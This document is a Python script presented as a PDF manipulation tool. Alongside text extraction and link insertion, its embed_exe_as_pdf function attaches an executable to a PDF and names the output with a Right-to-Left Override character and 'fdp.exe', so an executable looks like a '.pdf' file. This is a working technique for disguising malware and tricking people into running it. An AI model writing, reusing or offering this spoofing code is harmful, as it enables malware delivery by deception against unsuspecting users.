import os
import argparse
import PyPDF2
import logging
import webbrowser

# © 2024 Yahyaldye. All rights reserved. This code is provided as-is and may not be reproduced without permission.

def setup_logging():
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def create_link_annotation(url):
    return PyPDF2.generic.DictionaryObject({
        PyPDF2.generic.NameObject('/Type'): PyPDF2.generic.NameObject('/Annot'),
        PyPDF2.generic.NameObject('/Subtype'): PyPDF2.generic.NameObject('/Link'),
        PyPDF2.generic.NameObject('/Rect'): PyPDF2.generic.ArrayObject([100, 100, 200, 150]),
        PyPDF2.generic.NameObject('/Border'): PyPDF2.generic.ArrayObject([0, 0, 0]),
        PyPDF2.generic.NameObject('/A'): PyPDF2.generic.DictionaryObject({
            PyPDF2.generic.NameObject('/S'): PyPDF2.generic.NameObject('/URI'),
            PyPDF2.generic.NameObject('/URI'): PyPDF2.generic.TextStringObject(url)
        })
    })

def add_url_to_pdf(pdf_path, url):
    logging.info("Adding URL to PDF...")
    try:
        with open(pdf_path, "rb") as file:
            reader = PyPDF2.PdfReader(file)
            writer = PyPDF2.PdfWriter()

            for page in reader.pages:
                writer.add_page(page)

            link_annotation = create_link_annotation(url)
            if '/Annots' not in writer.pages[0]:
                writer.pages[0][PyPDF2.generic.NameObject('/Annots')] = PyPDF2.generic.ArrayObject()
            writer.pages[0][PyPDF2.generic.NameObject('/Annots')].append(link_annotation)

            new_pdf_path = f"modified_with_url_{os.path.basename(pdf_path)}"
            with open(new_pdf_path, "wb") as new_file:
                writer.write(new_file)

        logging.info(f"URL '{url}' added to PDF. New file: {new_pdf_path}")
        webbrowser.open(url)

    except Exception as e:
        logging.error(f"An unexpected error occurred while adding URL: {e}")

def embed_exe_as_pdf(pdf_path, exe_path):
    logging.info("Embedding .exe file into PDF...")
    try:
        rtl_char = '\u202E'  # Right-to-Left Override character
        base_name = os.path.splitext(pdf_path)[0]

        # Create a new PDF with the original content
        with open(pdf_path, "rb") as file:
            reader = PyPDF2.PdfReader(file)
            writer = PyPDF2.PdfWriter()

            for page in reader.pages:
                writer.add_page(page)

            # Gömme işlemi
            with open(exe_path, "rb") as exe_file:
                exe_data = exe_file.read()
                writer.add_attachment(os.path.basename(exe_path), exe_data)

            # Set the new PDF file name
            new_pdf_path = f"{base_name}{rtl_char}fdp.exe"
            with open(new_pdf_path, "wb") as new_file:
                writer.write(new_file)

        logging.info(f".exe file '{exe_path}' successfully embedded. New file: {new_pdf_path}")

    except Exception as e:
        logging.error(f"An unexpected error occurred while embedding .exe: {e}")

def extract_text_from_pdf(pdf_path):
    logging.info("Extracting text from PDF...")
    try:
        with open(pdf_path, "rb") as file:
            reader = PyPDF2.PdfReader(file)
            text = []
            for page in reader.pages:
                page_text = page.extract_text()
                if page_text:
                    text.append(page_text)
            return "\n".join(text) if text else "No text found."
    except Exception as e:
        logging.error(f"An unexpected error occurred: {e}")

def validate_file_path(file_path):
    if not os.path.exists(file_path):
        logging.error(f"Error: File '{file_path}' not found.")
        return False
    if not os.path.isfile(file_path):
        logging.error(f"Error: '{file_path}' is not a file.")
        return False
    return True

def main():
    setup_logging()
    parser = argparse.ArgumentParser(description="Advanced PDF manipulation tool")
    parser.add_argument("pdf_path", help="Path to the PDF file")
    parser.add_argument("--url", help="URL to be added")
    parser.add_argument("--exe", help="Path to the .exe file to be embedded")
    parser.add_argument("--extract", action="store_true", help="Extract text from the PDF")
    args = parser.parse_args()

    if not validate_file_path(args.pdf_path):
        return

    if args.extract:
        text = extract_text_from_pdf(args.pdf_path)
        if text:
            output_file = f"extracted_text_from_{os.path.basename(args.pdf_path)}.txt"
            with open(output_file, "w") as text_file:
                text_file.write(text)
            logging.info(f"Extracted text saved to {output_file}")
    elif args.url:
        add_url_to_pdf(args.pdf_path, args.url)
    elif args.exe:
        if not validate_file_path(args.exe):
            return
        embed_exe_as_pdf(args.pdf_path, args.exe)
    else:
        logging.error("Please specify a URL or .exe file, or use --extract to extract text.")

if __name__ == "__main__":
    main()
